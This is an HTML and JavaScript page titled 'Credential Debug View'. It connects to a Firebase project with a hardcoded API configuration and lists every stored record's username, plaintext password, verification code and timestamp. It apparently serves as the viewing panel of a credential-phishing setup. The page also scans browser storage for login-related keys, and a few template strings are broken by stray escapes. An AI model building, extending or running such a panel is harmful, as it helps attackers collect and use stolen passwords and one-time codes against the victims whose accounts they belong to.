<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debug View</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .section {
            margin: 20px 0;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .section h2 {
            margin-top: 0;
            color: #333;
        }
        .credential {
            border: 1px solid #ddd;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        .credential p {
            margin: 5px 0;
        }
        .credential strong {
            color: #333;
        }
        .no-credentials {
            text-align: center;
            color: #666;
            padding: 20px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f5f5f5;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Credential Debug View</h1>
    
    <div class="section">
        <h2>1. Firebase Credentials</h2>
        <button onclick="checkFirebase()">Check Firebase</button>
        <div id="firebaseResult"></div>
    </div>
    
    <div class="section">
        <h2>2. Local Storage</h2>
        <button onclick="checkLocalStorage()">Check Local Storage</button>
        <div id="localStorageResult"></div>
    </div>
    
    <div class="section">
        <h2>3. Session Storage</h2>
        <button onclick="checkSessionStorage()">Check Session Storage</button>
        <div id="sessionStorageResult"></div>
    </div>
    
    <div class="section">
        <h2>4. Current View Page Data</h2>
        <button onclick="checkCurrentView()">Check Current View</button>
        <div id="currentViewResult"></div>
    </div>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

<script>
    // Your Firebase configuration - replace with your actual config
    const firebaseConfig = {
        apiKey: "AIzaSyCIhHiH2itV7A2SxMY0g3fFsg0iQwfA4pI",
        authDomain: "login-ffcdd.firebaseapp.com",
        projectId: "login-ffcdd",
        storageBucket: "login-ffcdd.firebasestorage.app",
        messagingSenderId: "28209257330",
        appId: "1:28209257330:web:bf28e753372939b3629beb"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    function checkFirebase() {
        const resultDiv = document.getElementById('firebaseResult');
        resultDiv.innerHTML = '<div>Loading...</div>';
        
        db.collection("credentials").get()
        .then((querySnapshot) => {
            if (querySnapshot.size === 0) {
                resultDiv.innerHTML = '<div class="no-credentials">No credentials found in Firebase</div>';
                return;
            }
            
            let html = `<div>Found \${querySnapshot.size} credential(s) in Firebase:</div>`;
            querySnapshot.forEach((doc) => {
                const data = doc.data();
                html += `<div class="credential">`;
                html += `<p><strong>ID:</strong> ${doc.id}</p>`;
                html += `<p><strong>Username:</strong> ${data.username || 'N/A'}</p>`;
                html += `<p><strong>Password:</strong> ${data.password || 'N/A'}</p>`;
                html += `<p><strong>Verification:</strong> ${data.verification || 'N/A'}</p>`;
                html += `<p><strong>Timestamp:</strong> ${data.timestamp || 'N/A'}</p>`;
                html += `</div>`;
            });
            resultDiv.innerHTML = html;
        })
        .catch((error) => {
            resultDiv.innerHTML = `<div>Error: ${error.message}</div>`;
            console.error("Firebase error:", error);
        });
    }
    
    function checkLocalStorage() {
        const resultDiv = document.getElementById('localStorageResult');
        resultDiv.innerHTML = '<div>Loading...</div>';
        
        try {
            const credentials = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('credential') || key.includes('login')) {
                    const value = localStorage.getItem(key);
                    credentials.push({ key, value });
                }
            }
            
            if (credentials.length === 0) {
                resultDiv.innerHTML = '<div class="no-credentials">No credentials found in local storage</div>';
                return;
            }
            
            let html = `<div>Found \${credentials.length} credential(s) in local storage:</div>`;
            credentials.forEach(item => {
                html += `<div class="credential">`;
                html += `<p><strong>Key:</strong> ${item.key}</p>`;
                html += `<p><strong>Value:</strong> <pre>${JSON.stringify(JSON.parse(item.value), null, 2)}</pre></p>`;
                html += `</div>`;
            });
            resultDiv.innerHTML = html;
        } catch (error) {
            resultDiv.innerHTML = `<div>Error: ${error.message}</div>`;
            console.error("Local storage error:", error);
        }
    }
    
    function checkSessionStorage() {
        const resultDiv = document.getElementById('sessionStorageResult');
        resultDiv.innerHTML = '<div>Loading...</div>';
        
        try {
            const credentials = [];
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key.includes('credential') || key.includes('login')) {
                    const value = sessionStorage.getItem(key);
                    credentials.push({ key, value });
                }
            }
            
            if (credentials.length === 0) {
                resultDiv.innerHTML = '<div class="no-credentials">No credentials found in session storage</div>';
                return;
            }
            
            let html = `<div>Found ${credentials.length} credential(s) in session storage:</div>`;
            credentials.forEach(item => {
                html += `<div class="credential">`;
                html += `<p><strong>Key:</strong> ${item.key}</p>`;
                html += `<p><strong>Value:</strong> <pre>${JSON.stringify(JSON.parse(item.value), null, 2)}</pre></p>`;
                html += `</div>`;
            });
            resultDiv.innerHTML = html;
        } catch (error) {
            resultDiv.innerHTML = `<div>Error: \${error.message}</div>`;
            console.error("Session storage error:", error);
        }
    }
    
    function checkCurrentView() {
        const resultDiv = document.getElementById('currentViewResult');
        resultDiv.innerHTML = '<div>Loading...</div>';
        
        // Try to load credentials the same way as your view.html
        db.collection("credentials").get()
        .then((querySnapshot) => {
            if (querySnapshot.size === 0) {
                resultDiv.innerHTML = '<div class="no-credentials">No credentials found</div>';
                return;
            }
            
            // Convert to array and sort by timestamp (newest first)
            const credentials = [];
            querySnapshot.forEach((doc) => {
                const data = doc.data();
                data.id = doc.id;
                credentials.push(data);
            });
            
            credentials.sort((a, b) => {
                            return new Date(b.timestamp) - new Date(a.timestamp);
                        });
                        
                        let html = `<div>Found ${credentials.length} credential(s):</div>`;
                        credentials.forEach((cred) => {
                            html += `<div class="credential">`;
                            html += `<p><strong>ID:</strong> ${cred.id}</p>`;
                            html += `<p><strong>Username:</strong> ${cred.username || 'N/A'}</p>`;
                            html += `<p><strong>Password:</strong> ${cred.password || 'N/A'}</p>`;
                            html += `<p><strong>Verification:</strong> ${cred.verification || 'N/A'}</p>`;
                            html += `<p><strong>Timestamp:</strong> ${cred.timestamp || 'N/A'}</p>`;
                            html += `</div>`;
                        });
                        resultDiv.innerHTML = html;
                    })
                    .catch((error) => {
                        resultDiv.innerHTML = `<div>Error: ${error.message}</div>`;
                        console.error("Current view error:", error);
                    });
                }
</script>

</body>
</html>
